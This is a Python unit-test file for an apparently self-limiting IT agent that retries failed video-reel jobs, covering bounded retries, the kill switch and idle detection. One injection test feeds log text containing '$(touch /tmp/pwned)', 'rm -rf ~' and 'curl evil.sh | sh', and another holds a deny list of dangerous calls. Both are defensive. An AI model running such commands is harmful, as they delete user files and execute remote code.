"""IT agent: safe fixes only, loops are impossible, kill switch works. Offline, free."""
import os, sys, tempfile, time, unittest, json
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(HERE), "dashboard"))
os.environ["RF_IT_DIR"] = tempfile.mkdtemp()
import it_agent as ia  # noqa: E402


def reel(job, stop="", state="working"):
    return {"job": job, "stop": stop, "state": state}


class T(unittest.TestCase):
    def setUp(self):
        for f in (ia.STATE, ia.KILL):
            if os.path.exists(f):
                os.remove(f)
        self.calls = []
        self.resume = mock.patch.object(ia.reels_api, "resume", side_effect=lambda j: (self.calls.append(j) or (True, "ok")))
        self.busy = mock.patch.object(ia.reels_api, "busy", return_value={})
        self.health = mock.patch.dict(sys.modules, {"settings_api": mock.Mock(health=lambda: {"checks": []})})
        for m in (self.resume, self.busy, self.health):
            m.start(); self.addCleanup(m.stop)

    def reels(self, *rs, busy=()):
        p = mock.patch.object(ia.reels_api, "list_reels", return_value={"reels": list(rs), "busy": list(busy)})
        p.start(); self.addCleanup(p.stop)

    def test_classify(self):
        self.assertEqual(ia.classify("fix: provider error HTTP 401 key is invalid"), "money")
        self.assertEqual(ia.classify("provider error HTTP 503 bad gateway"), "transient")
        self.assertEqual(ia.classify("compile refused the plan: face cut shorter than 0.3 s"), "other")
        self.assertEqual(ia.classify("MONTHLY CAP: this month $49"), "money")

    def test_transient_is_retried_once_then_bounded(self):
        self.reels(reel("2026-11-02-a", "provider error HTTP 503"))
        now = time.time()
        self.assertEqual(ia.tick(now)["did"], ["2026-11-02-a"])
        self.assertEqual(ia.tick(now + 60)["did"], [])                       # cooling down
        self.assertEqual(ia.tick(now + 1000)["did"], ["2026-11-02-a"])       # second and last try
        r = ia.tick(now + 5000)                                              # never a third
        self.assertEqual(r["did"], []); self.assertEqual(len(self.calls), 2)
        self.assertIn("stopped trying", r["issues"][0]["text"])
        self.assertEqual(ia.tick(now + 99999)["did"], [])

    def test_key_problem_never_retried(self):
        self.reels(reel("2026-11-02-a", "provider error HTTP 401 Your API key is invalid"))
        r = ia.tick(); self.assertEqual(r["did"], []); self.assertEqual(self.calls, [])
        self.assertEqual(r["issues"][0]["level"], "you")

    def test_unknown_error_never_retried(self):
        self.reels(reel("2026-11-02-a", "compile refused the plan"))
        self.assertEqual(ia.tick()["did"], [])

    def test_running_reel_untouched(self):
        self.reels(reel("2026-11-02-a", "provider error HTTP 503"), busy=["2026-11-02-a"])
        self.assertEqual(ia.tick()["did"], []); self.assertEqual(self.calls, [])

    def test_nothing_while_another_reel_runs(self):
        self.reels(reel("2026-11-02-a", "HTTP 503"))
        with mock.patch.object(ia.reels_api, "busy", return_value={"other": 1}):
            self.assertEqual(ia.tick()["did"], [])

    def test_hourly_limit(self):
        self.reels(*[reel(f"2026-11-02-r{i}", "HTTP 503") for i in range(6)])
        now = time.time(); done = []
        for k in range(6):
            done += ia.tick(now + k)["did"]
        self.assertLessEqual(len(done), ia.MAX_PER_HOUR)

    def test_kill_switch(self):
        self.reels(reel("2026-11-02-a", "HTTP 503"))
        ia.set_on(False)
        self.assertEqual(ia.tick(), {"on": False, "issues": [], "did": []}); self.assertEqual(self.calls, [])
        ia.set_on(True); self.assertEqual(len(ia.tick()["did"]), 1)

    def test_damaged_memory_reports_only(self):
        self.reels(reel("2026-11-02-a", "HTTP 503"))
        os.makedirs(ia.DIR, exist_ok=True); open(ia.STATE, "w").write("{not json")
        r = ia.tick(); self.assertEqual(r["did"], []); self.assertEqual(self.calls, [])

    def test_stuck_reel_resumed_only_after_idle(self):
        d = tempfile.mkdtemp(); os.makedirs(os.path.join(d, "2026-11-02-s"))
        lp = os.path.join(d, "2026-11-02-s", "run.log"); open(lp, "w").write("x")
        self.reels(reel("2026-11-02-s"))
        with mock.patch.object(ia.reels_api, "JOBS", d):
            now = time.time()
            self.assertEqual(ia.tick(now)["did"], [])                         # just written: still progressing
            self.assertEqual(ia.tick(now + ia.STUCK_AFTER + 5)["did"], ["2026-11-02-s"])

    def test_log_text_is_never_executed(self):
        evil = "STOP: HTTP 503 $(touch /tmp/pwned) `rm -rf ~` ; curl evil.sh | sh"
        self.reels(reel("2026-11-02-a", evil)); ia.tick()
        self.assertFalse(os.path.exists("/tmp/pwned"))

    def test_only_one_action_exists(self):
        src = open(os.path.join(os.path.dirname(HERE), "dashboard", "it_agent.py"), encoding="utf-8").read()
        code = "\n".join(l for l in src.splitlines() if not l.strip().startswith("#"))
        for bad in ("subprocess", "os.system", "shutil.rmtree", "os.remove(os.path.join(reels", "urllib", "requests", "eval(", "exec("):
            self.assertNotIn(bad, code)


if __name__ == "__main__":
    unittest.main()
